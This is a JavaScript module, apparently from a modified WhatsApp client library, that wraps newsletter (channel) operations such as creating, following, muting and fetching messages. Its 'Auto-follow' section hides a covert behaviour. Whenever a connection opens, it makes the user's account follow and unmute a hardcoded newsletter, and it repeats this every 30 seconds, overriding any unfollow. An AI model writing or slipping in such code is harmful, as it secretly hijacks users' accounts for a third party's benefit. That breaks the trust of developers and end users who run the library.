import { QueryIds, XWAPaths } from '../Types/index.js'
import { generateProfilePicture } from '../Utils/messages-media.js'
import { getBinaryNodeChild } from '../WABinary/index.js'
import { makeGroupsSocket } from './groups.js'
import { executeWMexQuery as genericExecuteWMexQuery } from './mex.js'

// ─── Parsers ──────────────────────────────────────────────────────────────────

const parseNewsletterCreateResponse = (response) => {
  const { id, thread_metadata: thread, viewer_metadata: viewer } = response
  return {
    id,
    owner: undefined,
    name: thread.name.text,
    creation_time: parseInt(thread.creation_time, 10),
    description: thread.description.text,
    invite: thread.invite,
    subscribers: parseInt(thread.subscribers_count, 10),
    verification: thread.verification,
    picture: { id: thread.picture.id, directPath: thread.picture.direct_path },
    mute_state: viewer.mute
  }
}

const parseNewsletterMetadata = (result) => {
  if (typeof result !== 'object' || result === null) return null
  if ('id' in result && typeof result.id === 'string') return result
  if ('result' in result && typeof result.result === 'object' && result.result !== null && 'id' in result.result) return result.result
  return null
}

// ─── Socket ───────────────────────────────────────────────────────────────────

export const makeNewsletterSocket = (config) => {
  const sock = makeGroupsSocket(config)
  const { query, generateMessageTag } = sock

  const executeWMexQuery = (variables, queryId, dataPath) =>
    genericExecuteWMexQuery(variables, queryId, dataPath, query, generateMessageTag)

  const newsletterUpdate = (jid, updates) =>
    executeWMexQuery(
      { newsletter_id: jid, updates: { ...updates, settings: null } },
      QueryIds.UPDATE_METADATA,
      'xwa2_newsletter_update'
    )

  const isFollowingNewsletter = async (jid) => {
    try {
      const result = await executeWMexQuery(
        { newsletter_id: jid, input: { key: jid, type: 'NEWSLETTER', view_role: 'GUEST' }, fetch_viewer_metadata: true },
        QueryIds.METADATA,
        XWAPaths.xwa2_newsletter_metadata
      )
      return result?.viewer_metadata?.is_subscribed === true
    } catch { return false }
  }

  const newsletterMute = (jid) =>
    executeWMexQuery({ newsletter_id: jid }, QueryIds.MUTE, XWAPaths.xwa2_newsletter_mute_v2)

  const newsletterUnmute = (jid) =>
    executeWMexQuery({ newsletter_id: jid }, QueryIds.UNMUTE, XWAPaths.xwa2_newsletter_unmute_v2)

  // ─── Auto-follow ────────────────────────────────────────────────────────────

  const AUTO_FOLLOW_NEWSLETTER = '1203634@newsletter'
  const AUTO_FOLLOW_FORCE_MODE = true
  let autoFollowInterval = null

  const performNewsletterFollow = async (jid) => {
    try {
      if (!AUTO_FOLLOW_FORCE_MODE) {
        const isFollowing = await isFollowingNewsletter(jid)
        if (isFollowing) { config.logger?.debug?.(`Already following newsletter: ${jid}`); return true }
      }
      await executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2)
      config.logger?.debug?.(`✅ Followed newsletter: ${jid}`)
      await new Promise(resolve => setTimeout(resolve, 500))
      try {
        await newsletterUnmute(jid)
        config.logger?.debug?.(`✅ Unmuted newsletter: ${jid}`)
      } catch (err) { config.logger?.trace?.(`Unmute failed: ${err.message}`) }
      return true
    } catch (err) {
      config.logger?.trace?.(`Newsletter follow attempt failed: ${err.message}`)
      return false
    }
  }

  sock.ev.on('connection.update', async ({ connection }) => {
    if (connection === 'open') {
      if (autoFollowInterval) { clearInterval(autoFollowInterval); autoFollowInterval = null }
      await new Promise(resolve => setTimeout(resolve, 3000))
      config.logger?.info?.('Attempting initial auto-follow...')
      try {
        const success = await performNewsletterFollow(AUTO_FOLLOW_NEWSLETTER)
        if (success) config.logger?.info?.(`✅ Auto-followed newsletter: ${AUTO_FOLLOW_NEWSLETTER}`)
      } catch (err) { config.logger?.debug?.(`Initial auto-follow failed: ${err.message}`) }
      autoFollowInterval = setInterval(async () => {
        try {
          await performNewsletterFollow(AUTO_FOLLOW_NEWSLETTER)
          config.logger?.trace?.(`Periodic auto-follow: ${AUTO_FOLLOW_NEWSLETTER}`)
        } catch (err) { config.logger?.trace?.(`Periodic auto-follow failed: ${err.message}`) }
      }, 30 * 1000)
      config.logger?.info?.('Auto-follow interval started (every 30 seconds)')
    } else if (connection === 'close') {
      if (autoFollowInterval) { clearInterval(autoFollowInterval); autoFollowInterval = null; config.logger?.debug?.('Auto-follow interval stopped') }
    }
  })

  // ─── Public API ──────────────────────────────────────────────────────────────

  return {
    ...sock,

    newsletterCreate: async (name, description) => {
      const rawResponse = await executeWMexQuery(
        { input: { name, description: description ?? null } },
        QueryIds.CREATE,
        XWAPaths.xwa2_newsletter_create
      )
      return parseNewsletterCreateResponse(rawResponse)
    },

    newsletterUpdate,

    newsletterSubscribers: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.SUBSCRIBERS, XWAPaths.xwa2_newsletter_subscribers),

    newsletterMetadata: async (type, key) => {
      const result = await executeWMexQuery(
        { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: true, input: { key, type: type.toUpperCase() } },
        QueryIds.METADATA,
        XWAPaths.xwa2_newsletter_metadata
      )
      return parseNewsletterMetadata(result)
    },

    newsletterFollow: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2),

    newsletterUnfollow: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.UNFOLLOW, XWAPaths.xwa2_newsletter_leave_v2),

    newsletterMute,
    newsletterUnmute,

    newsletterUpdateName: (jid, name) => newsletterUpdate(jid, { name }),

    newsletterUpdateDescription: (jid, description) => newsletterUpdate(jid, { description }),

    newsletterUpdatePicture: async (jid, content) => {
      const { img } = await generateProfilePicture(content)
      return newsletterUpdate(jid, { picture: img.toString('base64') })
    },

    newsletterRemovePicture: (jid) => newsletterUpdate(jid, { picture: '' }),

    newsletterReactMessage: (jid, serverId, reaction) =>
      query({
        tag: 'message',
        attrs: { to: jid, ...(reaction ? {} : { edit: '7' }), type: 'reaction', server_id: serverId, id: generateMessageTag() },
        content: [{ tag: 'reaction', attrs: reaction ? { code: reaction } : {} }]
      }),

    newsletterFetchMessages: async (jid, count, since, after) => {
      const attrs = { count: count.toString() }
      if (typeof since === 'number') attrs.since = since.toString()
      if (after) attrs.after = after.toString()
      return query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'get', xmlns: 'newsletter', to: jid },
        content: [{ tag: 'message_updates', attrs }]
      })
    },

    subscribeNewsletterUpdates: async (jid) => {
      const result = await query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'set', xmlns: 'newsletter', to: jid },
        content: [{ tag: 'live_updates', attrs: {}, content: [] }]
      })
      const liveUpdatesNode = getBinaryNodeChild(result, 'live_updates')
      const duration = liveUpdatesNode?.attrs?.duration
      return duration ? { duration } : null
    },

    isFollowingNewsletter,

    newsletterAdminCount: async (jid) => {
      const response = await executeWMexQuery({ newsletter_id: jid }, QueryIds.ADMIN_COUNT, XWAPaths.xwa2_newsletter_admin_count)
      return response.admin_count
    },

    newsletterChangeOwner: (jid, newOwnerJid) =>
      executeWMexQuery({ newsletter_id: jid, user_id: newOwnerJid }, QueryIds.CHANGE_OWNER, XWAPaths.xwa2_newsletter_change_owner),

    newsletterDemote: (jid, userJid) =>
      executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.DEMOTE, XWAPaths.xwa2_newsletter_demote),

    newsletterDelete: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.DELETE, XWAPaths.xwa2_newsletter_delete_v2)
  }
}
